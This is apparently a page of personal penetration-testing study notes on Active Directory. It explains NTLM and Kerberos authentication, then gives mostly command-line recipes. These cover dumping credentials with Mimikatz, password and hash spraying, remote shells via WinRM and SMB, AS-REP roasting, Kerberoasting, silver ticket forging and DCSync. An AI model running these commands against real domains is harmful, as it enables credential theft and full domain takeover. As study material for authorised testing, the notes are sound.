@@ -1,0 +1,214 @@
+<h3 id="understanding-authentication">Understanding Authentication</h3>
+<p><strong>NTLM</strong></p>
+<ul>
+<li>Used when authenticating via IP address (not hostname) or a hostname not present on the AD DNS server</li>
+<li>Steps are:<ul>
+<li>Calculate NTLM Hash</li>
+<li>Send username to application server</li>
+<li>App server sends nonce</li>
+<li>Client encrypts nonce using their hash and sends both to app server</li>
+<li>App server sends client response, username, and nonce to the DC (user&#39;s hash unknown)</li>
+<li>DC encrypts nonce with NTLM hash (already known) of the user and compares to response</li>
+<li>If valid, DC approves authentication</li>
+</ul>
+</li>
+</ul>
+<p><strong>Kerberos</strong></p>
+<ul>
+<li>Adopted from Kerberos v5 from MIT, used as primary auth method since 2003</li>
+<li>Uses a ticket system, DC acts as a Key Distribution Center (KDC)</li>
+<li>Rather than authenticating against the application, clients get a ticket from the KDC</li>
+<li>Steps:<ul>
+<li>Client sends Authentication Server Request (AS-REQ) to the DC<ul>
+<li>This contains a timestamp encrypted using the hash derived from the user&#39;s username and password</li>
+</ul>
+</li>
+<li>DC receives request and looks up the password hash of the user in the <code>ntds.dit</code> file, using it to decrypt the timestamp</li>
+<li>If the decryption is successful and the timestamp is unique, auth is granted</li>
+<li>DC then sends client an Authentication Server Reply (AS-REP), containing a session key and a ticket-granting ticket (TGT)<ul>
+<li>Session key can be decrypted with user hash and reused</li>
+<li>TGT contains user and domain info, IP address of client, timestamp, and a session key<ul>
+<li>The TGT is encrypted using the NTLM hash of the krbtgt user</li>
+<li>TGT is valid for 10 hours by default and is automatically renewed while session remains active</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>Client constructs a Ticket-Granting Service Request (TGS-REQ) consisting of the current user and timestamp encrypted with the session key, resource name, and encrypted TGT and sends that back to the DC/KDC</li>
+<li>The DC then ensures the resource exists and decrypts the TGT with its secret key and extracts the session key for the username and timestamp of the request</li>
+<li>The KDC then performs the following checks:<ul>
+<li>The TGT has a valid timestamp</li>
+<li>The username from the TGS-REQ matches the username of the TGT</li>
+<li>The client IP address coincides with the TGT IP address</li>
+</ul>
+</li>
+<li>If those checks pass, the KDC responds with a Ticket-Granting Server Reply (TGS-REP), containing three parts:<ul>
+<li>Name of the service access granted for</li>
+<li>2nd session key to be used between the client and service</li>
+<li>Service ticket containing the username, group memberships, and 2nd session key</li>
+</ul>
+</li>
+<li>Now that the client has a session key and a service ticket, it sends the application an Application Request (AP-REQ) including the username/timestamp encrypted with the service ticket session key and the ticket itself</li>
+<li>The application server decrypts the service ticket using its account password hash, extracting the username/session key, using the session key to decrypt the username from the AP-REQ. If they match, the service assigns the appropriate permissions to the user based on the group memberships in the ticket, and access is granted</li>
+</ul>
+</li>
+</ul>
+<p><strong>Cached Credentials</strong></p>
+<ul>
+<li>Password hashes stored in Local Security Authority Subsystem Service (LSASS)</li>
+<li>Basically just use Mimikatz as before<ul>
+<li><code>privilege::debug</code> gives us the <code>SeDebugPrivilege</code> to run below commands</li>
+<li><code>token::elevate</code> to elevate to SYSTEM user</li>
+<li><code>lsadump::sam</code> will dump NTLM hashes of local users</li>
+<li><code>sekurlsa::logonpasswords</code> will look for clear-text passwords, dump NTLM hashes (including domain users), and dump Kerberos tickets</li>
+<li><code>sekurlsa::tickets</code> will show tickets stored in memory<ul>
+<li>We want to steal TGT more than a TGS for overall service access (rather than just one)</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>Public Key Infrastructure (PKI)<ul>
+<li>Part of the Active Directory Certificate Service (AD CS), which implements PKI to exchange digital certs between authenticated users and trusted resources</li>
+<li>Certificate Authority (CA) servers can grant/revoke certificates<ul>
+<li>The private keys used are usually non-exportable, but Mimikatz&#39;s <code>crypto::capi</code> and <code>crypto::cng</code> can take care of that</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="ad-password-attacks">AD Password Attacks</h3>
+<p><strong>Password Spraying</strong></p>
+<ul>
+<li>Avoiding lockout - <code>net accounts</code> will show authentication lockout information</li>
+<li>Using <a href="https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/modules/Spray-Passwords.ps1">script enumeration</a> <ul>
+<li><code>.\Spray-Passwords.ps1 -Pass Nexus123! -Admin</code></li>
+</ul>
+</li>
+<li>SMB password spraying<ul>
+<li>Use <code>crackmapexec</code><ul>
+<li><code>crackmapexec smb {IP_with_smb} -u users.txt -p passwords.txt -d {domain} --continue-on-success</code><ul>
+<li>Can also pass single username/password</li>
+</ul>
+</li>
+<li>This sprays passwords against a single IP&#39;s SMB share</li>
+<li>This will also show whether the user is an administrator</li>
+</ul>
+</li>
+<li>SMB hash spraying<ul>
+<li><code>crackmapexec smb {IP} -u {users.txt} -H {hashes.txt}</code></li>
+</ul>
+</li>
+<li>Crackmapexec can also run comands via SMB:<ul>
+<li><code>nxc smb {IP} -u {username} -p {password} -X &#39;powershell -e ...</code></li>
+</ul>
+</li>
+</ul>
+</li>
+<li>Obtaining TGTs<ul>
+<li>Use <a href="https://github.com/ropnop/kerbrute/releases/">kerbrute</a> - <code>.\kerbrute_windows_amd64.exe passwordspray -d {domain} .\usernames.txt &quot;{password}&quot;</code></li>
+<li>AS-REP Roasting without credentials, described below</li>
+</ul>
+</li>
+<li>WinRM<ul>
+<li>Indicated by port 5985/5986</li>
+<li><code>evil-winrm -i {IP} -u {domain_user} -p {password}</code></li>
+<li>Also accepts NTLM hashes <code>evil-winrm -i {IP} -u {user} -H {hash}</code></li>
+</ul>
+</li>
+<li>RPC:<ul>
+<li>Indicated by port 135,593</li>
+<li>Can get an RPC shell with <code>rpcclient -U {username} {IP}</code><ul>
+<li><code>enumdomusers</code> can get the domain users from within RPC, which we can then check again for preauth</li>
+<li><code>queryuser {username}</code> to get user properties (passwords could be in descriptions)<ul>
+<li>Can also just <code>querydispinfo</code></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<p><strong>AS-REP Roasting</strong></p>
+<ul>
+<li>Requires that Kerberos preauth is disabled, which prevents sending an AS-REQ on behalf of any user</li>
+<li>Performing hash cracking after receiving the AS-REP from the KDC</li>
+<li>Performed with <code>impacket-GetNPUsers</code> on kali side<ul>
+<li><code>impacket-GetNPUsers -dc-ip {dc} -request -outputfile hashes.asreproast {domain}/{username}</code> (alongside password)<ul>
+<li>With users.txt: <code>impacket-GetNPUsers {domain}/ -no-pass -usersfile users.txt -dc-ip {IP} | grep -v &#39;KDC_ERR_C_PRINCIPAL_UNKNOWN&#39;</code></li>
+</ul>
+</li>
+<li>Hashes can be cracked with Hashcat&#39;s 18200</li>
+</ul>
+</li>
+<li>Performed with <a href="https://github.com/r3motecontrol/Ghostpack-CompiledBinaries"><code>Rubeus</code></a> on Windows side<ul>
+<li><code>.\Rubeus.exe asreproast /nowrap</code></li>
+</ul>
+</li>
+<li>This can also be done without a password to find users who don&#39;t have Kerberos pre-auth<ul>
+<li><code>impacket-GetNPUsers -dc-ip {IP} {domain}/</code></li>
+<li>These users don&#39;t require a password to grab the TGT hash</li>
+</ul>
+</li>
+</ul>
+<p><strong>Kerberoasting</strong></p>
+<ul>
+<li>Cracking the password of the service account by using the encrypted SPN password hash used on the service ticket</li>
+<li>Can use <code>impacket-GetUserSPNs</code> if remote with creds<ul>
+<li><code>impacket-GetUserSPNs {domain}/{user}:{password} -dc-ip {IP} -request</code></li>
+</ul>
+</li>
+<li>Can use <code>Rubeus</code> again if local<ul>
+<li><code>.\Rubeus.exe kerberoast /outfile:hash.txt</code></li>
+</ul>
+</li>
+<li>Can crack with Hashcat&#39;s 13100 mode</li>
+</ul>
+<p><strong>Silver Tickets</strong></p>
+<ul>
+<li>Forging our own service tickets via a password hash that should only be known to the DC and service account<ul>
+<li>Basically forging a ticket using a hash that tells the service we have more permissions than we actually do</li>
+<li>This requires that Privileged Account Certificate (PAC) be disabled, which it often is</li>
+</ul>
+</li>
+<li>To create the ticket, we need:<ul>
+<li>SPN password hash - can use <code>sekurlsa::logonpasswords</code> on machine with established session with application (usually(?) current machine)</li>
+<li>Domain SID - <code>whoami /user</code> minus the last number (user RID)</li>
+<li>Target SPN - basically just the DNS host name and the protocol (like HTTP)</li>
+</ul>
+</li>
+<li>Performed using <code>mimikatz</code><ul>
+<li>Don&#39;t escalate privileges to <code>NT Authority\System</code></li>
+<li><code>kerberos::golden /sid:{sid} /domain:{domain} /ptt /target:{dnshostname} /service:{service_protocol(http)} /rc4:{NTLM_hash} /user:{any_domain_user}</code><ul>
+<li><code>ptt</code> allows us to inject forged ticket into memory of target machine</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>Then, we should be able to access the service with the following:<ul>
+<li><code>iwr -UseDefaultCredentials {protocol}://{dnshostname}</code></li>
+</ul>
+</li>
+</ul>
+<p><strong>Domain Controller Synchronization</strong></p>
+<ul>
+<li>Sometimes multiple DCs across an environment for redundancy</li>
+<li>These DCs use Directory Replication Service (DRS) to synchronize</li>
+<li>DCs receiving requests for updates don&#39;t check if the request came from a known DC and only verify that the SID has the correct privileges<ul>
+<li>This means that we just need a user with the correct privileges</li>
+<li><em>Required</em>: Replicating Directory Changes, Replicating Directory Changes All, Replicating Directory Changes in Filtered Set <ul>
+<li>Owned by Domain Admins, Enterprise Admins, and Administrators by default</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>If we have <code>WriteDACL</code> on the domain via a group, we can give ourselves the necessary permissions</li>
+<li>Performed with <code>mimikatz</code> on domain-joined machine or <code>impacket-secretsdump</code> on kali<ul>
+<li>This gives us a way to get the hash of any domain user</li>
+<li><code>lsadump::dcsync /user:{domain}\{user}</code> </li>
+</ul>
+</li>
+<li>Can also be performed with <code>impacket-secretsdump</code><ul>
+<li><code>impacket-secretsdump -just-dc-user {target_domain_user} {domain}/{admin_username}:&quot;{password}&quot;@{DC_IP}</code></li>
+</ul>
+</li>
+</ul>
